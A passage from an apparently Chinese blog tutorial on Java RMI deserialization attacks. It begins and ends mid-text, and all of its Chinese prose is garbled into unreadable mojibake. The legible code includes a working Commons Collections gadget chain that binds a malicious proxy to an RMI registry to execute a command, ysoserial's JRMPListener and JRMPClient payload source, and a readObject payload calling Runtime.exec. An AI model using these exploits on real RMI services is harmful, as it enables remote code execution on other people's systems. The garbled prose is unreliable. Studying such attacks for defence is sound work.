Classã€‚</p><p>æ— è®º Server ç«¯è¿˜æ˜¯ Client ç«¯ï¼Œåªè¦æœ‰ä¸€ç«¯é…ç½®äº† <code>java.rmi.server.codebase</code>ï¼Œè¿™ä¸ªå±æ€§éƒ½ä¼šè·Ÿéšæ•°æ®æµåœ¨ä¸¤ç«¯æµåŠ¨ã€‚</p><p><strong>å› æ­¤ï¼ŒClient ç«¯å¯ä»¥é€šè¿‡é…ç½®æ­¤é¡¹å±æ€§ï¼Œå¹¶å‘ Server ç«¯ä¼ é€’ä¸å­˜åœ¨çš„ç±»ï¼Œä½¿ Server ç«¯è¯•å›¾ä» <code>java.rmi.server.codebase</code> åœ°å€ä¸­è¿œç¨‹åŠ è½½æ¶æ„ç±»è€Œè§¦å‘æ”»å‡»ã€‚</strong></p><h4 id="æ›¿èº«æ”»å‡»"><a href="#æ›¿èº«æ”»å‡»" class="headerlink" title="æ›¿èº«æ”»å‡»"></a>æ›¿èº«æ”»å‡»</h4><p>åœ¨è®¨è®ºå¯¹ Server ç«¯çš„æ”»å‡»æ—¶ï¼Œè¿˜å‡ºç°äº†å¦å¤–ä¸€ç§é’ˆå¯¹å‚æ•°çš„æ”»å‡»æ€è·¯ï¼Œsu18å¸ˆå‚…ç§°å…¶ä¸ºæ›¿èº«æ”»å‡»ã€‚ä¾æ—§æ˜¯ç”¨æ¥ç»•è¿‡å½“å‚æ•°ä¸æ˜¯ Objectï¼Œæ˜¯æŒ‡å®šç±»å‹ï¼Œä½†æ˜¯è¿˜æƒ³è§¦å‘ååºåˆ—åŒ–çš„ä¸€ç§è®¨è®ºã€‚</p><p>å¤§ä½“çš„æ€è·¯å°±æ˜¯è°ƒç”¨çš„æ–¹æ³•å‚æ•°æ˜¯ <code>HelloObject</code>ï¼Œè€Œæ”»å‡»è€…å¸Œæœ›ä½¿ç”¨ CC é“¾æ¥ååºåˆ—åŒ–ï¼Œæ¯”å¦‚ä½¿ç”¨äº†ä¸€ä¸ªå…¥å£ç‚¹ä¸º HashMap çš„ POCï¼Œé‚£ä¹ˆæ”»å‡»è€…åœ¨æœ¬åœ°çš„ç¯å¢ƒä¸­å°† HashMap é‡å†™ï¼Œè®© HashMap ç»§æ‰¿ HelloObjectï¼Œç„¶åå®ç°ååºåˆ—åŒ–æ¼æ´æ”»å‡»çš„é€»è¾‘ï¼Œç”¨æ¥æ¬ºéª— RMI çš„æ ¡éªŒæœºåˆ¶ã€‚</p><p>è¿™çš„ç¡®æ˜¯ä¸€ç§æ€è·¯ï¼Œä½†æ˜¯è¿˜ä¸å¦‚ hook RMI ä»£ç ä¿®æ”¹é€»è¾‘æ¥å¾—å¿«ï¼Œæ‰€ä»¥è¿™é‡Œä¸è¿›è¡Œæµ‹è¯•ã€‚</p><h3 id="Registry-ç«¯-Attack"><a href="#Registry-ç«¯-Attack" class="headerlink" title="Registry ç«¯ Attack"></a>Registry ç«¯ Attack</h3><p>åœ¨ä½¿ç”¨ Registry æ—¶ï¼Œé¦–å…ˆç”± Server ç«¯å‘ Registry ç«¯ç»‘å®šæœåŠ¡å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡æ˜¯ä¸€ä¸ª Server ç«¯ç”Ÿæˆçš„åŠ¨æ€ä»£ç†ç±»ï¼ŒRegistry ç«¯ä¼šååºåˆ—åŒ–è¿™ä¸ªç±»å¹¶å­˜åœ¨è‡ªå·±çš„ RegistryImpl çš„ bindings ä¸­ï¼Œä»¥ä¾›åç»­çš„æŸ¥è¯¢ã€‚</p><p>æ‰€ä»¥å¦‚æœæˆ‘ä»¬æ˜¯ä¸€ä¸ªæ¶æ„çš„ Server ç«¯ï¼Œå‘ Registry ç«¯è¾“é€äº†ä¸€ä¸ªæ¶æ„çš„å¯¹è±¡ï¼Œåœ¨å…¶ååºåˆ—åŒ–æ—¶å°±å¯ä»¥è§¦å‘æ¶æ„è°ƒç”¨ã€‚</p><p>è¿™é‡Œä»ç„¶ç”¨ CC6 æµ‹è¯•ï¼Œè€Œå› ä¸º bind çš„å‚æ•°æ˜¯éœ€è¦æ˜¯ Remote ç±»å‹çš„ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨äº† AnnotationInvocationHandler æ¥ä»£ç†äº† Remote æ¥å£ï¼Œå½¢æˆäº†ååºåˆ—åŒ–æ¼æ´ã€‚</p><p>å½¢å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// è¿æ¥ Registry</span><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1099</span>);<br><br>        <span class="hljs-comment">//ä½¿ç”¨ AnnotationInvocationHandler åŠ¨æ€ä»£ç† Remote</span><br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        HashMap&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;EddieMurphy&quot;</span>, getEvilClass());<br><br>        <span class="hljs-comment">//ä½¿ç”¨åŠ¨æ€ä»£ç†åˆå§‹åŒ– AnnotationInvocationHandler</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map);<br><br>        <span class="hljs-comment">//ä½¿ç”¨ AnnotationInvocationHandler åŠ¨æ€ä»£ç† Remote</span><br>        <span class="hljs-type">Remote</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> (Remote) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Remote.class&#125;, invocationHandler);<br><br>        <span class="hljs-comment">//bind åˆ° Registry æ—¶ä¼šè§¦å‘ååºåˆ—åŒ–</span><br>        registry.rebind(<span class="hljs-string">&quot;EddieMurphy&quot;</span>, remote);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getEvilClass</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// åˆå§‹åŒ– Hashmap</span><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        <span class="hljs-comment">// åˆ›å»º ChainedTransformer</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦ Registry ç«¯å…·æœ‰ç›¸åº”çš„ä¾èµ–åŠç›¸åº” JDK ç‰ˆæœ¬éœ€æ±‚ã€‚</p><p>è¿™ä¸ªæ”»å‡»æ‰‹æ®µå®é™…ä¸Šå°±æ˜¯ ysoserial ä¸­çš„ <strong>ysoserial.exploit.RMIRegistryExploit</strong> çš„å®ç°åŸç†ã€‚</p><p>é™¤äº† bindï¼Œç”±äº lookup&#x2F;rebind ç­‰æ–¹æ³•å‡é€šè¿‡ååºåˆ—åŒ–ä¼ é€’æ•°æ®ï¼Œå› æ­¤æ­¤å¤„çš„å®é™…æ”»å‡»æ‰‹æ®µä¸æ­¢ bind ä¸€ç§ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåä¹‰ä¸Šçš„ Server ç«¯å’Œ Client ç«¯éƒ½å¯ä»¥æ”»å‡» Registry ç«¯ã€‚</p><h3 id="Client-ç«¯-Attack"><a href="#Client-ç«¯-Attack" class="headerlink" title="Client ç«¯ Attack"></a>Client ç«¯ Attack</h3><p>å¦‚æœæ”»å‡»çš„ç›®æ ‡ä½œä¸º Client ç«¯ï¼Œä¹Ÿå°±æ˜¯åœ¨ Registry åœ°å€å¯æ§ï¼Œæˆ– Registry&#x2F;Server ç«¯å¯æ§ï¼Œä¹Ÿæ˜¯å¯ä»¥å¯¼è‡´æ”»å‡»çš„ã€‚å®¢æˆ·ç«¯ä¸»è¦æœ‰ä¸¤ä¸ªäº¤äº’è¡Œä¸ºï¼Œç¬¬ä¸€æ˜¯ä» Registry ç«¯è·å–è°ƒç”¨æœåŠ¡çš„ stub å¹¶ååºåˆ—åŒ–ï¼Œç¬¬äºŒæ­¥æ˜¯è°ƒç”¨æœåŠ¡åè·å–æ‰§è¡Œç»“æœå¹¶ååºåˆ—åŒ–ã€‚</p><p>è¿™éƒ¨åˆ†æ”»å‡»å®æˆ˜æ„ä¹‰è¾ƒå°‘ï¼Œå¹¶ä¸”ä¸ä¸Šè¿°è®¨è®ºçš„æ”»å‡» Server ç«¯å’Œ Registry ç«¯çš„æ”»å‡»éƒ½æ˜¯é•œåƒè¡Œä¸ºï¼Œæ‰€ä»¥è¿™é‡Œç®€å•æè¿°ä¸€ä¸‹æµç¨‹å°±ä¸å†æ¼”ç¤ºäº†ã€‚</p><p>å®¢æˆ·ç«¯çš„æ”»å‡»å’Œä¸Šé¢çš„éƒ½ç±»ä¼¼ï¼Œå¤§æ¦‚å°±ä¸‹é¢å‡ ä¸ªæ”»å‡»ç‚¹</p><ul><li>æ¶æ„Serverè¿”å›æ–¹æ³•è°ƒç”¨ç»“æœ</li><li>æ¶æ„Server(Registry)è¿”å›Stub</li><li>åŠ¨æ€ç±»åŠ è½½ï¼ˆServerè¿”å›çš„è°ƒç”¨ç»“æœè‹¥ä¸ºå®¢æˆ·ç«¯ä¸å­˜åœ¨çš„ç±»ï¼Œå®¢æˆ·ç«¯ä¹Ÿæ”¯æŒåŠ¨æ€åŠ è½½ï¼‰</li></ul><h3 id="DGC-Attack"><a href="#DGC-Attack" class="headerlink" title="DGC Attack"></a>DGC Attack</h3><p><strong>DGCï¼ˆDistributed Garbage Collectionï¼‰</strong>â€”â€” åˆ†å¸ƒå¼åƒåœ¾å›æ”¶ï¼Œå½“ Server ç«¯è¿”å›ä¸€ä¸ªå¯¹è±¡åˆ° Client ç«¯ï¼ˆè¿œç¨‹æ–¹æ³•çš„è°ƒç”¨æ–¹ï¼‰æ—¶ï¼Œå…¶è·Ÿè¸ªè¿œç¨‹å¯¹è±¡åœ¨ Client ç«¯ä¸­çš„ä½¿ç”¨ã€‚å½“å†æ²¡æœ‰æ›´å¤šçš„å¯¹ Client è¿œç¨‹å¯¹è±¡çš„å¼•ç”¨æ—¶ï¼Œæˆ–è€…å¦‚æœå¼•ç”¨çš„â€œç§Ÿå€Ÿâ€è¿‡æœŸå¹¶ä¸”æ²¡æœ‰æ›´æ–°ï¼ŒæœåŠ¡å™¨å°†åƒåœ¾å›æ”¶è¿œç¨‹å¯¹è±¡ã€‚å¯åŠ¨ä¸€ä¸ª RMI æœåŠ¡ï¼Œå°±ä¼šä¼´éšç€ DGC æœåŠ¡ç«¯çš„å¯åŠ¨ã€‚</p><p>RMI å®šä¹‰äº†ä¸€ä¸ª <code>java.rmi.dgc.DGC</code> æ¥å£ï¼Œæä¾›äº†ä¸¤ä¸ªæ–¹æ³• <code>dirty</code> å’Œ <code>clean</code>ï¼š</p><ul><li>å®¢æˆ·ç«¯æƒ³è¦ä½¿ç”¨æœåŠ¡ç«¯ä¸Šçš„è¿œç¨‹å¼•ç”¨ï¼Œä½¿ç”¨ <code>dirty</code> æ–¹æ³•æ¥æ³¨å†Œä¸€ä¸ªã€‚åŒæ—¶è¿™è¿˜è·Ÿç§Ÿæˆ¿å­ä¸€æ ·ï¼Œè¿‡æ®µæ—¶é—´ç»§ç»­ç”¨çš„è¯è¿˜è¦å†è°ƒç”¨ä¸€æ¬¡æ¥ç»­ç§Ÿã€‚</li><li>å®¢æˆ·ç«¯ä¸ä½¿ç”¨çš„æ—¶å€™ï¼Œéœ€è¦è°ƒç”¨ <code>clean</code> æ–¹æ³•æ¥æ¸…æ¥šè¿™ä¸ªè¿œç¨‹å¼•ç”¨ã€‚</li></ul><p>è¿™ä¸ªæ¥å£æœ‰ä¸¤ä¸ªå®ç°ç±»ï¼Œåˆ†åˆ«æ˜¯ <code>sun.rmi.transport.DGCImpl</code> ä»¥åŠ <code>sun.rmi.transport.DGCImpl_Stub</code>ï¼ŒåŒæ—¶è¿˜å®šä¹‰äº† <code>sun.rmi.transport.DGCImpl_Skel</code>ã€‚</p><p>è¿™ä¸ªå‘½åæ–¹å¼çœ‹ç€ç¡®å®éå¸¸çœ¼ç†Ÿã€‚</p><p>æ²¡é”™ï¼Œå¾ˆåƒ Registryã€RegistryImplã€RegistryImpl_Stubã€RegistryImpl_Skelï¼Œå®é™…ä¸Šä¸å•æ˜¯å‘½åç›¸è¿‘ï¼Œå¤„ç†é€»è¾‘ä¹Ÿæ˜¯ç±»ä¼¼çš„ã€‚é€šè¿‡åœ¨æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯ä¹‹é—´ä¼ é€’å¼•ç”¨ï¼Œä¾æ—§æ˜¯ Stub ä¸ Skel ä¹‹é—´çš„é€šä¿¡æ¨¡å¼ï¼šServer ç«¯å¯åŠ¨ DGCImplï¼Œåœ¨ Registry ç«¯æ³¨å†Œ DGCImpl_Stub ï¼ŒClient ç«¯è·å–åˆ° DGCImpl_Stubï¼Œé€šè¿‡å…¶ä¸ Server ç«¯é€šä¿¡ï¼ŒServer ç«¯ä½¿ç”¨ RegistryImpl_Skel æ¥å¤„ç†ã€‚</p><p>æ”»å‡»æ‰‹æ®µå°±æ˜¯</p><p>DGCImpl_Stub#dirty</p><p>DGCImpl_Skel#dispatch</p><p>è§ysoserialçš„<code>exploit.JRMPListener</code>å’Œ<code>exploit.JRMPClient</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JRMPListener</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">PayloadRunner</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectPayload</span>&lt;UnicastRemoteObject&gt; &#123;<br><br>    <span class="hljs-keyword">public</span> UnicastRemoteObject <span class="hljs-title function_">getObject</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String command )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">jrmpPort</span> <span class="hljs-operator">=</span> Integer.parseInt(command);<br>        <span class="hljs-type">UnicastRemoteObject</span> <span class="hljs-variable">uro</span> <span class="hljs-operator">=</span> Reflections.createWithConstructor(ActivationGroupImpl.class, RemoteObject.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>            RemoteRef.class<br>        &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnicastServerRef</span>(jrmpPort)<br>        &#125;);<br><br>        Reflections.getField(UnicastRemoteObject.class, <span class="hljs-string">&quot;port&quot;</span>).set(uro, jrmpPort);<br>        <span class="hljs-keyword">return</span> uro;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String[] args )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        PayloadRunner.run(JRMPListener.class, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JRMPClient</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">PayloadRunner</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectPayload</span>&lt;Registry&gt; &#123;<br><br>    <span class="hljs-keyword">public</span> Registry <span class="hljs-title function_">getObject</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String command )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        String host;<br>        <span class="hljs-type">int</span> port;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">sep</span> <span class="hljs-operator">=</span> command.indexOf(<span class="hljs-string">&#x27;:&#x27;</span>);<br>        <span class="hljs-keyword">if</span> ( sep &lt; <span class="hljs-number">0</span> ) &#123;<br>            port = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt(<span class="hljs-number">65535</span>);<br>            host = command;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            host = command.substring(<span class="hljs-number">0</span>, sep);<br>            port = Integer.valueOf(command.substring(sep + <span class="hljs-number">1</span>));<br>        &#125;<br>        <span class="hljs-type">ObjID</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjID</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt()); <span class="hljs-comment">// RMI registry</span><br>        <span class="hljs-type">TCPEndpoint</span> <span class="hljs-variable">te</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TCPEndpoint</span>(host, port);<br>        <span class="hljs-type">UnicastRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnicastRef</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LiveRef</span>(id, te, <span class="hljs-literal">false</span>));<br>        <span class="hljs-type">RemoteObjectInvocationHandler</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjectInvocationHandler</span>(ref);<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>            Registry.class<br>        &#125;, obj);<br>        <span class="hljs-keyword">return</span> proxy;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String[] args )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());<br>        PayloadRunner.run(JRMPClient.class, args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ”»å‡»çš„gadgetåˆ† UnicastRemoteObjectã€UnicastRefå’ŒRemoteObjectä¸‰ç§ã€‚è¿™é‡Œä¸åšè¿‡å¤šè§£é‡Šã€‚</p><p>æ€»ç»“ä¸º</p><ul><li>exploit<ul><li>JRMPListnerï¼šæ„é€ æ¶æ„JRMPæœåŠ¡å™¨ï¼Œè¿”å›å¼‚å¸¸è®©å®¢æˆ·ç«¯ååºåˆ—åŒ– <code>StreamRemoteCall#executeCall</code></li><li>JRMPClientï¼šå‘é€æ¶æ„åºåˆ—åŒ–æ•°æ®ï¼Œæ‰“DGCæœåŠ¡ <code>DGCImpl_Skel#dispatch</code></li></ul></li><li>payloads<ul><li>JRMPListnerï¼š<code>UnicastRemoteObject</code>ååºåˆ—åŒ–æ—¶ä¼šå¯¼å‡ºå¯¹è±¡ï¼Œè§¦å‘JRMPç›‘å¬ç«¯å£ï¼Œé…åˆexploit.JRMPClientæ‰“</li><li>JRMPClientï¼š<code>UnicastRef</code>ååºåˆ—åŒ–æ—¶ä¼šè§¦å‘DGCçš„<code>ditry</code>ï¼Œé…åˆexploit.JRMPListneræ‰“</li></ul></li></ul><h2 id="Final-Test"><a href="#Final-Test" class="headerlink" title="Final Test"></a>Final Test</h2><p>æœ€åæµ…æµ…æ‰“ä¸€ä¸ªç®€å•ä½¿ç”¨RMIæœåŠ¡è°ƒç”¨è¿œç¨‹å¯¹è±¡ååºåˆ—åŒ–å¼¹calcä½œä¸ºæˆ‘æœ€åçš„ç»“æŸå§ï¼ŒJEP 290çš„bypassæ”¾åœ¨åé¢æ–‡ç« å†è¿›è¡Œå¤ç°ã€‚JNDIä¹ŸåŒæ ·ä¼šæ”¾åœ¨åé¢å†è¯¦ç»†å¤ç›˜ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">payload</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream objectInputStream)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        objectInputStream.defaultReadObject();<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, AlreadyBoundException &#123;<br>        <span class="hljs-type">RMITestImpl</span> <span class="hljs-variable">rmiTest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMITestImpl</span>();<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">8081</span>);<br>        registry.bind(<span class="hljs-string">&quot;EddieMurphy&quot;</span>,rmiTest);<br>        System.out.println(<span class="hljs-string">&quot;RMI Server is listening ...&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span 